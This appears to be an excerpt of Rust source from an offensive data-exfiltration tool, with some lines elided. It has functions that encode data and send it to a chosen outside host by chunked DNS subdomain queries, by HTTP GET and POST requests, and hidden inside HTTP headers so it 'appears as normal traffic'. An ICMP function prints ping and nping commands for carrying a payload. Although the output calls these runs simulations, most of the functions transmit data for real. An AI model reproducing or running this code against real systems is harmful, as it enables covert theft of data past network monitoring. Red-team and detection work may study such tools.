...
pub async fn dns(domain: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let chunks: Vec<String> = encoded.chars().collect::<Vec<_>>().chunks(63).map(|c| c.iter().collect()).collect();
    println!("{} Chunks: {} (max 63 chars per label)", "[*]".cyan().bold(), chunks.len());
    ...
    for (i, chunk) in chunks.iter().enumerate() {
        ...
        println!("  {} Query {}/{}: {}", "*".cyan(), i + 1, chunks.len(), subdomain);
        ...
        match client.get(&url).send().await {
            Ok(resp) => {
                ...
                if body.contains("\"Answer\"") {
                    println!("    {} Resolved — data exfiltrated via DNS!", ">".green().bold());
                }
            }
            Err(_) => { println!("    {} Error sending query", ">".red()); }
        }
    }

    println!("\n{} DNS exfil simulation complete.", "[*]".cyan().bold());
    println!("{} In a real attack, the attacker controls the DNS server for {}.", "[*]".cyan().bold(), domain);
...
pub async fn icmp(host: &str, data: &str, _timeout: u64) -> anyhow::Result<()> {
    ...
    println!("{} Encoded: {} ({} bytes)", "[*]".cyan().bold(), encoded, bytes.len());

    let chunk_size = 32;
    let chunks: Vec<&[u8]> = bytes.chunks(chunk_size).collect();
    println!("{} ICMP packets needed: {} ({} bytes/packet)", "[*]".cyan().bold(), chunks.len(), chunk_size);

    for (i, chunk) in chunks.iter().enumerate() {
        let payload = String::from_utf8_lossy(chunk).to_string();
        println!("  {} Packet {}/{}: data={} ({} bytes)", "*".cyan(), i + 1, chunks.len(), payload, chunk.len());
    }

    println!("\n{} ICMP exfil simulation complete.", "[*]".cyan().bold());
    println!("{} In a real attack, send: ping -p <hex> -s {} {}", "[*]".cyan().bold(), chunk_size, host);
    println!("{} Or use: nping --icmp -c 1 --data-string <payload> {}", "[*]".cyan().bold(), host);
    Ok(())
}
...
pub async fn http(url: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let methods = [
        ...
        ("POST (json)", "POST", format!("{{\"data\":\"{}\"}}", encoded)),
    ...
    for (name, method, body) in &methods {
        ...
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, if status < 400 { "sent".green().to_string() } else { "error".to_string() });
            }
...
pub async fn stego(url: &str, data: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let channels = [
        ...
        ("User-Agent", vec![("User-Agent", format!("Mozilla/5.0 {}", encoded))] ),
        ("Referer", vec![("Referer", format!("https://example.com/{}", encoded))] ),
        ("X-Forwarded-For", vec![("X-Forwarded-For", format!("127.0.0.1 {}", encoded))] ),
        ("Multiple headers", vec![("X-A", encoded[..20].to_string()), ("X-B", encoded[20..].to_string())]),
    ];
    ...
    println!("{} Data hidden in HTTP headers — appears as normal traffic.", "[*]".cyan().bold());
    Ok(())
}
